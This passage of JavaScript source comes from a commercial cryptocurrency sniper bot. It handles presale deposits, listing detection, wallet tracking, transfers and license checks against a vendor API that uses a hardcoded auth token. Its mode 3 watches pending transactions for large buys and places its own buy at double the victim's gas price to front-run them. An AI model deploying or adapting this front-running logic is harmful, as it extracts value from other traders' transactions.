        consoleLog(chalk.magenta("Oficial version can only be bought from https://multisniperbot.com"));
        (async () => {
          await new Promise(r => setTimeout(r, 400))
          process.exit(0)
        })();
      }

      if (choseBlockChain == 1 && parseInt(response.data.bsc) == 1) {
        blockChainSelected = 'bsc';
      } else if (choseBlockChain == 2 && parseInt(response.data.eth) == 1) {
        blockChainSelected = 'eth';
      } else if (choseBlockChain == 3 && parseInt(response.data.polygon) == 1) {
        blockChainSelected = 'polygon';
      } else {
        console.log("Please contact support!!! Your MultiSniper Plus is not allowed on any blockchains!");
        (async () => {
          await new Promise(r => setTimeout(r, 400))
          process.exit(0)
        })();

      }

    }
    else {
      consoleLog(chalk.magenta("Your MultiSniper Plus is not allowed on this blockchain or your not licensed to use this software, please contact us on discord: https://discord.gg/4qpbk4Jp or on telegram: https://t.me/multisniperbots"));
      consoleLog(chalk.magenta("You will also get this message if your trying to access the Contract Addon ilegally"));
      consoleLog(chalk.magenta("Oficial version can only be bought from https://multisniperbot.com"));
      (async () => {
        await new Promise(r => setTimeout(r, 400))
        process.exit(0)
      })();
    }
  });

  if (choseMode == 1) {
    consoleLog(chalk.red(`WARNING: This Sniper mode snipes Presale.`));
    if (selectPresale == 1) {
      consoleLog(chalk.red(`DxSale Presale selected.`));
    } else if (selectPresale == 2) {
      consoleLog(chalk.red(`Unicrypt Presale selected.`));
    } else if (selectPresale == 3) {
      consoleLog(chalk.red(`PinkSale Presale selected.`));
    } else {
      consoleLog(chalk.magenta("Wrong presale option selected... exiting!"));
      process.exit(0)
    }
    consoleLog(chalk.magenta("Oficial website: https://multisniperbot.com"));
    consoleLog(chalk.magenta(`For Support please join discord server on https://discord.gg/4qpbk4Jp or telegram group https://t.me/multisniperbots.`));
    consoleLog(chalk.green(`Connected to blockchain... \n`));
    consoleLog(chalk.green(`Sniper started with current settings:`));
    if (snipePresale == false) {
      if (claimTokens == true) {
        consoleLog(chalk.green(`Claim tokens from Presale only...`));
      }
    } else {
      consoleLog(chalk.green('Send ' + chalk.yellow(bnb_amount) + ' BNB using ' + chalk.yellow(gas_limit) + ' Gas and ' + chalk.yellow(gas_price) + ' Gwei' + ' to presale address: ' + chalk.yellow(presale_address)));
    }

    (async () => {
      if (needApproval == true && claimTokens == true) {
        if (approveBeforeOrAfter == 1) {
          await startApprove();
        }
      }

      if (snipePresale == false) {
        if (claimTokens == true) {
          console.log("Waiting for presale to be listed and claim tokens...");
          await claimPresaleTokens();
        } else {
          consoleLog(chalk.green(`No action selected....`));
          await new Promise(r => setTimeout(r, 400))
          process.exit(0)
        }
      }
      if (snipePresale == true) {
        if (selectPresale == 1) {
          await snipeDxSaleStart(presale_address, bnb_amount, account);
        } else if (selectPresale == 2) {
          let snipeIt = null;
          const signer = wallet.connect(provider);
          currentNonce = await signer.getTransactionCount();
          consoleLog(chalk.red(`Unicrypt Presale selected.`));
          const unicryptContract = new ethers.Contract(
            presale_address,
            [
              'function userDeposit (uint256 _amount) external payable nonReentrant'
            ],
            account
          );

          let multipleText = 0;
          let unicryptStartBlock = await getPresalInfoFromV6(presale_address, provider);
          let currentBlockDetected = await provider.getBlockNumber();
          console.log('Current Block: ' + currentBlockDetected)
          let newBlock = 0;
          if (currentBlockDetected < unicryptStartBlock) {
            console.log("Waiting for presale to start ...");
            provider.on("pending", async (tx) => {
              targeBlock = await provider.getBlockNumber();
              if (unicryptStartBlock <= targeBlock) {
                // console.log("Sniping....")
                if (stopLoop == 0) {
                  stopLoop = 1;
                  let depositAmount = ethers.utils.parseEther(bnb_amount);
                  consoleLog('Start buying token with ' + chalk.green(bnb_amount) + ' BNB...');
                  try {
                    snipeIt = await unicryptContract.userDeposit(
                      ethers.utils.parseUnits('0', 'gwei'),
                      { gasLimit: dXgasLimit, gasPrice: dXgasPrice, value: depositAmount, nonce: currentNonce }
                    );

                  } catch (e) {
                    console.log(String(e))
                    await new Promise(r => setTimeout(r, 400))
                    process.exit(0)
                  }
                  let confirmationHash = await getConfirmationHash(snipeIt.hash);
                  if (confirmationHash == true) {
                    consoleLog(`Successfully bought the token, check your transaction here`);
                    consoleLog(chalk.green(`https://` + chainScanner + `/tx/${snipeIt.hash}`));
                    if (claimTokens == true) {
                      console.log("Waiting for presale to be listed and claim tokens...");
                      await claimPresaleTokens();
                    } else {
                      consoleLog(chalk.green(`No action selected....`));
                      await new Promise(r => setTimeout(r, 400))
                      process.exit(0)
                    }
                  } else {
                    consoleLog(`FAILED !!! Check for reason here`);
                    consoleLog(chalk.green(`https://` + chainScanner + `/tx/${snipeIt.hash}`));
                    await new Promise(r => setTimeout(r, 400))
                    process.exit(0);
                  }
                }



              }

            })
          } else {
            if (stopLoop == 0) {
              stopLoop = 1;
              let depositAmount = ethers.utils.parseEther(bnb_amount);
              consoleLog('Start buying token with ' + chalk.green(bnb_amount) + ' BNB...');
              try {
                snipeIt = await unicryptContract.userDeposit(
                  ethers.utils.parseUnits('0', 'gwei'),
                  { gasLimit: dXgasLimit, gasPrice: dXgasPrice, value: depositAmount, nonce: currentNonce }
                );

              } catch (e) {
                console.log(String(e))
                await new Promise(r => setTimeout(r, 400))
                process.exit(0)
              }
              let confirmationHash = await getConfirmationHash(snipeIt.hash);
              if (confirmationHash == true) {
                consoleLog(`Successfully bought the token, check your transaction here`);
                consoleLog(chalk.green(`https://` + chainScanner + `/tx/${snipeIt.hash}`));
                if (claimTokens == true) {
                  console.log("Waiting for presale to be listed and claim tokens...");
                  await claimPresaleTokens();
                } else {
                  consoleLog(chalk.green(`No action selected....`));
                  await new Promise(r => setTimeout(r, 400))
                  process.exit(0)
                }
              } else {
                consoleLog(`FAILED !!! Check for reason here`);
                consoleLog(chalk.green(`https://` + chainScanner + `/tx/${snipeIt.hash}`));
                await new Promise(r => setTimeout(r, 400))
                process.exit(0);
              }
            }




          }


        } else if (selectPresale == 3) {
          consoleLog(chalk.red(`PinkSale Presale selected.`));
          //pinksale
          const smallPinkSalePresale = presale_address.toLowerCase();
          snipeNow = false;
          passed = 0;
          const signer = wallet.connect(provider);
          let transactionTarget = null;

          (async () => {
            currentNonce = await getNonce(myAddress);
            let txParams = {
              nonce: currentNonce,
              gasLimit: pinksalePresaleGas,
              gasPrice: pinksalePresaleGwei,
              chainId: 56,
              value: pinksalePresaleAmmount,
              to: pinksalePresaleAddress,
              data: 0xd7bb99ba
            };

            transactionRaw = await account.signTransaction(txParams, currentNonce);

            if (whiteListActive) {
              let authTokenHasci = '9BF1E98D2C1A2099632E681B0C71FCD1F8F36236938E1B5F1FC752B8732F7CDC';
              let paramz = new URLSearchParams();
              paramz.append('token', authTokenHasci);
              await axios.post('https://multi-sniper.com/apiPlus.php', paramz).then(function (response) {
                if (response.data) {
                  if (response.data != null) {
                    nrWallets = response.data;
                  }
                }
              });
              if (nrWallets > 5) {

              } else {
                consoleLog('Please purchase the Multi Wallet Addon from https://multisniperbot.com for access to "Snipe after Whitelist"!');
                process.exit(0);
              }
              await new Promise(r => setTimeout(r, 300));
              consoleLog('Waiting for whitelist section to end ....');
              consoleLog('--------------------------------------------------------------');
              consoleLog('Traking open presale to public .....');
            } else {
              consoleLog('Waiting for countdown to end ....');
              for (i = 1; i > 0;) {
                pairLiquidityValue = await provider.getBalance(presale_address);
                if (pairLiquidityValue.gt(zeroValue)) {
                  i = 0;
                  consoleLog('Presale started!!!');
                  consoleLog('--------------------------------------------------------------');
                  snipeNow = true;
                  passed++;

                }

              }


            }

            provider.on("pending", async (tx) => {
              const transaction = await provider.getTransaction(tx);

              if (transaction != null && transaction.to != undefined) {
                transactionTarget = transaction.to.toLowerCase();
                if (whiteListActive) {

                  if (transactionTarget == smallPinkSalePresale && snipeNow == false && (transaction.data.includes('0x5feb14d30000000000000000000000000000000000000000000000000000000000000000') || transaction.data.includes('0x6d5d40c6'))) {
                    presale_gwei = transaction.gasPrice;
                    snipeNow = true;
                    passed++;
                  }
                } else {

                  if (transactionTarget == smallPinkSalePresale && snipeNow == false) {
                    snipeNow = true;
                    passed++;
                  }
                }


              }

              if (snipeNow == true && passed == 1) {

                snipeNow = false;


                console.log('Sniping....')
                try {
                  snipeIt = await provider.sendTransaction(transactionRaw);
                  snipeResult = await snipeIt.wait();
                  console.log("Snipe was successfull!!");
                  await new Promise(r => setTimeout(r, 400))
                  if (claimTokens == true) {
                    console.log("Waiting for presale to be listed and claim tokens...");
                    await claimPresaleTokens();
                  } else {
                    process.exit(0)
                  }
                } catch (error) {
                  console.log("Snipe failed!!!");
                  await new Promise(r => setTimeout(r, 400))
                  if (whiteListActive) {
                    process.exit(0);
                  }
                  passed = 0;
                  snipeNow = false;
                  process.exit(0);
                };

              }


            })

          })();


          //pinksale
        } else {
          consoleLog(chalk.magenta("Wrong presale option selected... exiting!"));
          process.exit(0)
        }
      }

    })();
  } else if (choseMode == 2) {


    if (buyOrSnipe == 2) {
      delayOnBuy = 0;
      snipeNow = true;
      passed = 1;
    } else {
      snipeNow = false;
      passed = 0;
    }
    (async () => {
      let authTokenHasci = '9BF1E98D2C1A2099632E681B0C71FCD1F8F36236938E1B5F1FC752B8732F7CDC';
      let paramz = new URLSearchParams();
      paramz.append('token', authTokenHasci);
      paramz.append('action', 'remove');
      await axios.post('https://multi-sniper.com/apiPlusUsers.php', paramz).then(function (response) {
      });
      paramz.append('ca', TokenContract.toLowerCase());
      paramz.append('action', 'add');
      await axios.post('https://multi-sniper.com/apiPlusUsers.php', paramz).then(function (response) {
        io.emit('multiSnipers', response.data.data);
      });

      currentNonce = await getNonce(myAddress)
      ownerWallet = ownerWallet.toLowerCase();

      let devAddesses = await getDevAddresses(TokenContract, provider);

      if (devAddesses.owner == undefined) {

      } else {
        if (ownerWallet != devAddesses.owner.toLowerCase()) {
          console.log("The owner address you inputed is different from the one we detected!!")
          console.log("Please check owner address: " + devAddesses.owner + " if its correct!")
        }
      }
      if (choseMethode == 1) {
        if (exchangeToken == 1) {
          balanceETHER = await provider.getBalance(myAddress);
        } else {
          balanceETHER = await getTokenBalance(ETHER, myAddress, provider);
        }
      } else {
        balanceETHER = await getTokenBalance(ETHER, contract, provider)
      }
      consoleLog(chalk.red('WARNING: This Sniper mode detects and snipes any listings on ' + marketName + ' using ' + tradingMethode + ' transactions!'))
      consoleLog(chalk.magenta("Oficial website: https://multisniperbot.com"));
      consoleLog(chalk.magenta(`For Support please join discord server on https://discord.gg/4qpbk4Jp or telegram group https://t.me/multisniperbots.`));

      if (tg_wait_for_contract == false) {

        await waitSnipeOnCall();


      }
      if (tg_wait_for_contract) {

        TokenContract = null;
        if (tg_wait_for_contract && TokenContract == null) {

          if (process.env.tg_secret_phrase.length < 64) {
            consoleLog(chalk.magenta("Please activate your telegram on: https://client.multi-sniperbot.com"));
            await new Promise(r => setTimeout(r, 50))
            process.exit(0)
          } else {
            tg_secret_phrase = new StringSession(process.env.tg_secret_phrase)
          }
          consoleLog(chalk.magenta("Waiting for token post on: https://t.me/" + tg_channel));

          // process.env.tg_wait_for_contract = false;
          let standby = false;
          standby = await telegramSnipe()
          while (standby == false) {

          }
        } else {
          process.exit(0)
        }
      }


    })();

  } else if (choseMode == 3) {
    //run frontrunn mode
    const buyMethod1 = '0x8803dbee';
    const buyMethod2 = '0x5c11d795';
    const buyMethod3 = '0x7ff36ab5';
    const buyMethod4 = '0x38ed1739';
    const buyMethod5 = '0xfb3bdb41';
    const buyMethod6 = '0xd72ef771';
    const buyMethod7 = '0xb6f9de95';
    autoGas = false;
    delayOnBuy = 0;
    delaySell = 0;
    exchangeToken = 1;
    ETHER = bsc.wbnbBep20;
    instantSell = true;
    sellAuto = true;
    sellDelay = 0;
    delayOnSellMs = 0;
    approveBeforeOrAfter = 2;
    needApproval = true;
    curency = "BNB";
    sell_Gwei = ethers.utils.parseUnits('10', 'gwei');
    sell_Gwei = 1500000;
    amountIn = ethers.utils.parseUnits(process.env.frontrunnAmount, 'ether');
    nrOfSellTransactions = 1;
    nrOfBuyTransactions = 1;
    sendMultiWallet = false;
    let valueToFrontrunn = ethers.utils.parseEther(process.env.frontrunnMinTxValue);
    let targetPriceDetected = false;
    let tokenToMatch;
    let targetToken;
    let transactionDetails;
    var abiTransfers = ["function balanceOf(address owner) view returns (uint)", "function transfer(address to, uint amount)", "event Transfer(address indexed from, address indexed to, uint amount)"];
    let ifaceInterface = new ethers.utils.Interface(abiTransfers);


    (async () => {
      currentNonce = await getNonce(myAddress);
      let balanceWBNB = await provider.getBalance(myAddress);
      consoleLog(chalk.red(`WARNING: This Sniper mode is Frontrunn.`))
      consoleLog(chalk.magenta("Oficial website: https://multisniperbot.com"));
      consoleLog(chalk.magenta(`For Support please join discord server on https://discord.gg/4qpbk4Jp.`));
      consoleLog(chalk.magenta(`Or old support group on telegram https://t.me/multisniperbots.`));
      consoleLog(chalk.green(`Connected to blockchain... \n`))
      consoleLog(chalk.green(`Sniper started with current settings:`))
      consoleLog(chalk.green(`Total BNB balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(balanceWBNB, 18)).toFixed(6))}\n`))
      consoleLog(chalk.green('Target buy transaction over ' + chalk.yellow(process.env.frontrunnMinTxValue) + ' BNB.'))
      consoleLog(chalk.green('Sell token using ' + chalk.yellow(gasLimitSell) + ' Gas and ' + chalk.yellow(gasPriceSell / 1000000000) + ' Gwei'))
      consoleLog(chalk.yellow(`Waiting for targeted transaction on mempool...`))
      provider.on("pending", async (tx) => {
        const transaction = await provider.getTransaction(tx)

        if (transaction != null && (transaction['data'].includes(buyMethod1) || transaction['data'].includes(buyMethod2) || transaction['data'].includes(buyMethod3) || transaction['data'].includes(buyMethod4) || transaction['data'].includes(buyMethod5) || transaction['data'].includes(buyMethod6) || transaction['data'].includes(buyMethod7)) && passed == 0 && transaction['to'].toLowerCase() == routerAddress.toLowerCase()) {
          let tokensArray = process.env.tokensArrayMonitor.split(",");
          let arrayLenght = tokensArray.length;
          for (i = 0; i < arrayLenght; i++) {

            tokenToMatch = tokensArray[i].toLowerCase();

            if (transaction['data'].includes(tokenToMatch.toLowerCase().substring(2))) {

              if (transaction.value.gte(valueToFrontrunn)) {
                targetToken = tokensArray[i];
                tokenAddress = tokensArray[i];
                gasPrice = transaction.gasPrice.mul(2);
                gasPriceSell = transaction.gasPrice.mul(2);
                targetPriceDetected = true;
              }
            } else {
            }
          }
          if (targetPriceDetected) {
            targetPriceDetected = false;
            passed = 1;
            console.log('High purchase detected on: ' + targetToken);
            console.log('Transaction to frontrunn: https://' + chainScanner + '/tx/' + transaction.hash)
            tokenAddress = targetToken;
            snipeNow = true;
            await startSnipe();
          }


        } else {
        }

      })

    })();
  } else if (choseMode == 4) {
    let TokenContract = null;
    let tokenAddress = null;
    let token;
    let toContract;
    let passed = 0;

    consoleLog(chalk.red(`WARNING: This Sniper mode is to detect new contracts created on BSC/ETHEREUM/POLYGON.`));
    consoleLog(chalk.magenta("Oficial website: https://multisniperbot.com"));
    consoleLog(chalk.magenta(`For Support please join discord server on https://discord.gg/4qpbk4Jp.`));
    consoleLog(chalk.magenta(`Or old support group on telegram https://t.me/multisniperbots.`));
    if (choseBlockChain == 1 || choseBlockChain == 2 || choseBlockChain == 3) {
      consoleLog(chalk.green(`Connected to blockchain... \n`));
      consoleLog(chalk.green(`Waiting for new contracts to be deployed... \n`));

      (async () => {
        let authTokenHasci = '9BF1E98D2C1A2099632E681B0C71FCD1F8F36236938E1B5F1FC752B8732F7CDC';
        let paramz = new URLSearchParams();
        paramz.append('token', authTokenHasci);
        await axios.post('https://multi-sniper.com/apiPlus.php', paramz).then(function (response) {
          if (response.data) {
            if (response.data != null) {
              nrWallets = response.data;

            }
          }
        });
        if (nrWallets > 5) {

        } else {
          consoleLog('Please purchase the Multi Wallet Addon from https://multisniperbot.com for access to this mode!');
          process.exit(0);
        }
        provider.on("pending", async (tx) => {
          const transaction = await provider.getTransaction(tx)
          if (transaction != null && transaction.to == null) {
            tokenAddress = await getReciptCtr(transaction.hash);
          }
        })
      })();
    } else {
      consoleLog(chalk.green(`Please chose the correct BlockChain!\n`));
      process.exit(0);
    }


  } else if (choseMode == 5) {
    const valuex = ethers.utils.parseEther("1.0");
    snipeOnWalletCallBNB = ethers.utils.parseUnits(process.env.amount_BNB_buy, 'ether');
    gasLimit = parseInt(process.env.buy_Gas);
    consoleLog('WARNING: This Sniper mode is to track calls from a targeted wallet to a targeted token on BSC.');
    consoleLog('Oficial website: https://multisniperbot.com');
    consoleLog('For Support please join discord server on https://discord.gg/4qpbk4Jp.');
    consoleLog('Or old support group on telegram https://t.me/multisniperbots.');
    exchangeToken = 1;
    (async () => {

      let authTokenHasci = '9BF1E98D2C1A2099632E681B0C71FCD1F8F36236938E1B5F1FC752B8732F7CDC';
      let paramz = new URLSearchParams();
      paramz.append('token', authTokenHasci);
      await axios.post('https://multi-sniper.com/apiPlus.php', paramz).then(function (response) {
        if (response.data) {
          if (response.data != null) {
            nrWallets = response.data;

          }
        }
      });
      if (nrWallets > 5) {

      } else {
        consoleLog('Please purchase the Multi Wallet Addon from https://multisniperbot.com for access to this mode!');
        process.exit(0);
      }
      currentNonce = await getNonce(myAddress);
      await new Promise(r => setTimeout(r, 300));
      if (choseBlockChain == 1) {
        console.log('Connected to blockchain... \n');
        tokenDetails = await getMinTokenInfo(TokenContract, provider);
        if (tokenDetails == undefined) {
          console.log('------------------------------------------------------------------');
          console.log('Make sure the contract you entered is correct!');
          if (snipeOnWalletCall) {
            console.log('Warning!!! You will snipe the token on every call the target wallet makes untill a successfull snipe!');
            console.log('Warning!!! The target token cant be sniped! ... Stoping MultiSniper Plus...');
            process.exit(0);
          }
          console.log('If its a smart contract or a router you are traking then please continue!');
          console.log('------------------------------------------------------------------');
        } else {
          console.log('------------------------------------------------------------------');
          console.log('Targeted token: ' + TokenContract);
          console.log('Targeted wallet: ' + walletAddress);
          console.log('Name: ' + tokenDetails.name);
          console.log('Symbol: ' + tokenDetails.symbol);
          console.log('Decimals: ' + tokenDetails.decimals);
          console.log('Total supply: ' + tokenDetails.totalSupply);
          console.log('------------------------------------------------------------------');
        }
        if (snipeOnWalletCall) {
          console.log('Warning!!! You will snipe the token on every call the target wallet makes untill a successfull snipe!');
        }
        console.log('Importing contract ABI...');
        responseData = await storeContractSource(TokenContract);
        console.log("Traking....");
        let tokenABI = responseData[0].ABI;
        let ifaceInterface = new ethers.utils.Interface(tokenABI);
        let snipeOnce = 0;
        if (choseMethode == 1) {
          if (approveBeforeOrAfter == 1) {
            await startApprove();
          }
        }
        provider.on("pending", async (tx) => {
          const transaction = await provider.getTransaction(tx)

          if (transaction != null && transaction.to != null) {
            targetContract = TokenContract.toLowerCase();
            targetWallet = walletAddress.toLowerCase();
            fromWallet = transaction.from.toLowerCase();
            toCtr = transaction.to.toLowerCase();
            if (fromWallet == targetWallet && toCtr == targetContract) {
              data = transaction.data;
              if (data != null) {
                console.log('------------------------------------------------------------------');
                console.log('Transaction hash: ' + transaction.hash);
                if (contractStatusNotVerfied == false) {
                  transactionDetails = ifaceInterface.parseTransaction({ data, valuex });
                  console.log('Transaction name: ' + transactionDetails.name);
                  console.log('Transaction function (used in mode 2): ' + transactionDetails.signature);
                  console.log('Function hash (used in mode 2): ' + transactionDetails.sighash);
                  if (transactionDetails.args != null) {
                    el = 1;
                    transactionDetails.args.forEach(element => {
                      if (ethers.BigNumber.isBigNumber(element)) {
                        console.log("Transaction argument detected " + el++ + " => " + element.toString());
                      }
                    });
                  }
                  console.log('Transaction value: ' + transactionDetails.value);
                }
                console.log('------------------------------------------------------------------');
                data = null;
                // TO DO LOOP ON FAILED SNIPE CALL
                gasPrice = transaction.gasPrice;
                snipeNow = true;
                passed = 1;
                if (snipeNow == true && snipeOnWalletCall == true && passed == 1) {
                  snipeNow = false;
                  if (delayOnBuy > 1) {
                    startBlock = await getBlockDelay(transaction.hash)
                  } else if (delayOnBuy == 1) {
                    await new Promise(r => setTimeout(r, 3000))
                    startBlock = null;
                  }
                  await startSnipe();
                }
              }
            }
          }

        })
      } else {
        consoleLog(chalk.green(`Please chose the correct BlockChain!\n`));
        process.exit(0);
      }
    })();


  } else if (choseMode == 6) {
    if (choseBlockChain == 2) {

    } else {
      consoleLog('WARNING: This Sniper mode is to track Listing on Uniswap (New Liquidity).');
      consoleLog('Oficial website: https://multisniperbot.com');
      consoleLog('For Support please join discord server on https://discord.gg/4qpbk4Jp.');
      consoleLog('Or old support group on telegram https://t.me/multisniperbots.');
      consoleLog('Will only work on Ethereum with MultiWallet Addon!');
      process.exit(0)
    }
    let ifaceInterface = new ethers.utils.Interface(abiTokenData);
    const valuex = ethers.utils.parseEther("1.0");
    let newTokenDetected;
    let liquidityToken;
    let liquidityEth;
    let nr = 1;
    consoleLog('WARNING: This Sniper mode is to track Listing on Uniswap (New Liquidity).');
    consoleLog('Oficial website: https://multisniperbot.com');
    consoleLog('For Support please join discord server on https://discord.gg/4qpbk4Jp.');
    consoleLog('Or old support group on telegram https://t.me/multisniperbots.');
    exchangeToken = 1;
    (async () => {

      let authTokenHasci = '9BF1E98D2C1A2099632E681B0C71FCD1F8F36236938E1B5F1FC752B8732F7CDC';
      let paramz = new URLSearchParams();
      paramz.append('token', authTokenHasci);
      await axios.post('https://multi-sniper.com/apiPlus.php', paramz).then(function (response) {
        if (response.data) {
          if (response.data != null) {
            nrWallets = response.data;

          }
        }
      });

      if (nrWallets > 5) {

      } else {
        consoleLog('Please purchase the Multi Wallet Addon from https://multisniperbot.com for access to this mode!');
        process.exit(0);
      }
      consoleLog('Conected to Ethereum BlockChain...');
      consoleLog('Waiting for new token listings...');
      provider.on("pending", async (tx) => {
        const transaction = await provider.getTransaction(tx);

        if (transaction != null && transaction.to != null) {
          let targetToken = transaction.to.toLowerCase();

          if ((transaction['data'].includes(MethodID1) || transaction['data'].includes(MethodID2) || transaction['data'].includes(MethodID3) || transaction['data'].includes(MethodID4))) {
            if (transaction.gasPrice.gte(minimumGweiUsed) && targetToken != sushiSwap) {
              var data = transaction.data;

              var transactionDetails = ifaceInterface.parseTransaction({ data, valuex });
              var argumentDetails = transactionDetails.args;

              argumentDetails.forEach((element, index) => {
                if (index == 0) {
                  newTokenDetected = element;
                }
                if (index == 1) {
                  if (ethers.BigNumber.isBigNumber(element)) {
                    liquidityToken = element;
                  } else {
                    liquidityToken = ethers.BigNumber.from('0');
                  }

                }
                if (index == 3) {
                  if (ethers.BigNumber.isBigNumber(element)) {
                    liquidityEth = element;
                  } else {
                    liquidityEth = ethers.utils.parseEther("0");
                  }
                }
              });

              let tokenInfoCall = await getMinTokenInfo(newTokenDetected, provider);

              /*    if(tokenInfoCall.symbol === "ODA" || tokenInfoCall.symbol === "Oda" || tokenInfoCall.symbol == "ODA" || tokenInfoCall.symbol == "Oda"){
                   console.log('=====Target=========' + nr++ + '=============FOUND!!!!!!!!================');
               }else{
                   console.log('====================' + nr++ + '==========================================');
               } */

              var timestamp = Date.now()
              var date = new Date(timestamp);
              console.log('====================' + nr++ + '==========================================');
              console.log('----DATE/TIME----> ' + +date.getDate() + "/" + (date.getMonth() + 1) + "/" + date.getFullYear() + " " + date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds() + ' <-------------------------');
              console.log('Contract: ' + newTokenDetected);
              console.log('Deployment Wallet: ' + transaction.from);
              console.log('Transaction Hash: ' + transaction.hash);
              gasLimit = transaction.gasLimit;
              gasPrice = transaction.gasPrice;
              blockGas = await web3.eth.getGasPrice();
              doATipOf = await web3.eth.getTransaction(transaction.hash);
              try {
                if ('maxPriorityFeePerGas' in doATipOf) {
                  tipMiners = doATipOf.maxPriorityFeePerGas;
                } else {
                  tipMiners = minGasPrice;
                }
              } catch (e) {
                tipMiners = minGasPrice;
              }
              console.log('GasLimit: ' + gasLimit);
              console.log('Gwei Estimated: ' + ethers.utils.formatUnits(blockGas, 9));
              console.log('Gwei: ' + ethers.utils.formatUnits(gasPrice, 9));
              console.log('Tip(Gwei): ' + ethers.utils.formatUnits(tipMiners, 9));
              console.log('----------------------------------------------------------------');


              try {
                let tokenInfoName = tokenInfoCall.name;
                let tokenInfoSymbol = tokenInfoCall.symbol;
                let tokenInfoDecimals = tokenInfoCall.decimals;
                let tokenInfoTotalSupply = tokenInfoCall.totalSupply;
                console.log('Name: ' + tokenInfoName);
                console.log('Symbol: ' + tokenInfoSymbol);
                console.log('Decimals: ' + tokenInfoDecimals);
                console.log('TotalSupply: ' + tokenInfoTotalSupply);
                console.log('----------------------------------------------------------------');
                console.log('Token Added: ' + parseFloat(ethers.utils.formatUnits(liquidityToken, tokenInfoDecimals)).toFixed(6) + " " + tokenInfoSymbol);
                console.log('Ether Added: ' + parseFloat(ethers.utils.formatUnits(liquidityEth, 18)).toFixed(6) + " ETH");
              } catch (e) {
                console.log('Name: ' + "Not Found");
                console.log('Symbol: ' + "Not Found");
                console.log('Decimals: ' + "Not Found");
                console.log('TotalSupply: ' + "Not Found");
                console.log('----------------------------------------------------------------');
                console.log('Token Added: ' + "Not Found");
                console.log('Ether Added: ' + "Not Found");
              }


              console.log('================================================================');

            } else {
            }
          } else {
          }
        }
      });
    })();


  } else if (choseMode == 7) {

    (async () => {
      if (utilAction == 3) {
        amount_transfer = ethers.utils.parseUnits(amount_transfer, 'ether');
        if (choseBlockChain == 1) {
          if (transferToken == 1) {
            curency = bsc.wbnbBep20;
          } else if (transferToken == 2) {
            curency = bsc.busdBep20;
          } else if (transferToken == 3) {
            curency = bsc.usdtBep20;
          } else if (transferToken == 4) {
            curency = bsc.usdcBep20;
          }
          else {
            curency = bsc.wbnbBep20;
          }
        } else if (choseBlockChain == 2) {
          if (transferToken == 1) {
            curency = eth.wethErc20;
          } else if (transferToken == 2) {
            curency = eth.usdtErc20;
          } else if (transferToken == 3) {
            curency = eth.usdcErc20;
          } else if (transferToken == 4) {
            curency = eth.daiErc20;
          } else {
            curency = eth.wethErc20;
          }
        } else if (choseBlockChain == 3) {
          if (transferToken == 1) {
            curency = polygon.wmaticErc721;
          } else {
            curency = polygon.wmaticErc721;
          }
        }
      } else {
        if (transferToken == 1) {
          curency = token_transfer;
          amount_transfer = ethers.utils.parseUnits(amount_transfer, 'ether');
        } else {
          if (transferToken == 2) {
            amount_transfer = ethers.utils.parseUnits(amount_transfer, 'ether');
            curency = null;
          } else {
            amount_transfer = ethers.utils.parseUnits(amount_transfer, 'ether');
            if (choseBlockChain == 1) {
              if (transferToken == 3) {
                curency = bsc.wbnbBep20;
              } else if (transferToken == 4) {
                curency = bsc.busdBep20;
              } else if (transferToken == 5) {
                curency = bsc.usdtBep20;
              } else if (transferToken == 6) {
                curency = bsc.usdcBep20;
              }
            } else if (choseBlockChain == 2) {
              if (transferToken == 3) {
                curency = eth.wethErc20;
              } else if (transferToken == 4) {
                curency = eth.usdtErc20;
              } else if (transferToken == 5) {
                curency = eth.usdcErc20;
              } else if (transferToken == 6) {
                curency = eth.daiErc20;
              }
            } else if (choseBlockChain == 3) {
              if (transferToken == 3) {
                curency = polygon.wmaticErc721;
              }
            } else {

            }

          }
        }
      }
      if (choseMethode == 3 && utilAction != 1) {
        consoleLog(chalk.green(`Your not allowed to use this Mode on this Methode... \n`))
        consoleLog(chalk.green(`Stopping the process.. \n`))
        await new Promise(r => setTimeout(r, 400))
        process.exit(0)
      } else if (choseMethode == 2 && (utilAction != 1 || utilAction != 4)) {
        consoleLog(chalk.green(`Your not allowed to use this Selection on this Mode... \n`))
        consoleLog(chalk.green(`Stopping the process.. \n`))
        await new Promise(r => setTimeout(r, 400))
        process.exit(0)
      }
      currentNonce = await account.getTransactionCount();
      if (choseBlockChain == 1) {
        console.log('Selected Binance Smart BlockChain!');
      } else if (choseBlockChain == 2) {
        console.log('Selected Ethereum BlockChain!');
      } else if (choseBlockChain == 3) {
        console.log('Selected Polygon BlockChain!');
      }

      consoleLog(chalk.red(`WARNING: This Sniper mode is Transfer & Utilities`))
      consoleLog(chalk.magenta("Oficial website: https://multisniperbot.com"));
      consoleLog(chalk.magenta(`For Support please join discord server on https://discord.gg/4qpbk4Jp or telegram group https://t.me/multisniperbots.`));
      consoleLog(chalk.green(`Connected to blockchain... \n`))
      if (utilAction == 1) {
        snipeExactTokens = false
        if (choseMethode == 1) {
          if (exchangeToken == 1) {
            balanceETHER = await provider.getBalance(myAddress);
          } else {
            balanceETHER = await getTokenBalance(ETHER, myAddress, provider);
          }
        } else {
          balanceETHER = await getTokenBalance(ETHER, contract, provider)
        }
        tokenInfoCall = new web3.eth.Contract(tokenInfoABI, TokenContract);

        tokenInfoDecimals = await tokenInfoCall.methods.decimals().call();
        tokenDecimals = tokenInfoDecimals;
        tokenInfoName = await tokenInfoCall.methods.name().call();
        tokenInfoSymbol = await tokenInfoCall.methods.symbol().call();
        totalInfoSupply = await tokenInfoCall.methods.totalSupply().call();
        Infosupply = ethers.BigNumber.from(totalInfoSupply);
        if (choseMethode == 3) {
          balance = await getTokenBalance(tokenAddress, contract, provider);
        } else {
          balance = await getTokenBalance(tokenAddress, myAddress, provider);
        }


        consoleLog(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(balance, tokenDecimals)).toFixed(6))}\n`))
        if (choseMethode != 3) {
          if (needApproval) {
            await startApprove();
          }
        }
        if (balance.gt(zeroValue)) {
          if (instantSell) {
            passed = 1;
            confirmedPuchase = true;
            if (antiRugActive) {
              if (sellFunctionHash.includes('0x')) {
                //console.log('its hashed!')
                functionToDetect = sellFunctionHash;
              } else {
                functionToDetect = getHashForFunction(sellFunctionHash);
                // console.log(functionToDetect);
              }
              await antiScam();
            } else {

              await sellOnlyMode();
            }
          }
        } else {
          console.log(balance)
          console.log((zeroValue))
          console.log(balance.gt(zeroValue))
          consoleLog(chalk.green(`The token balance is 0... \n`))
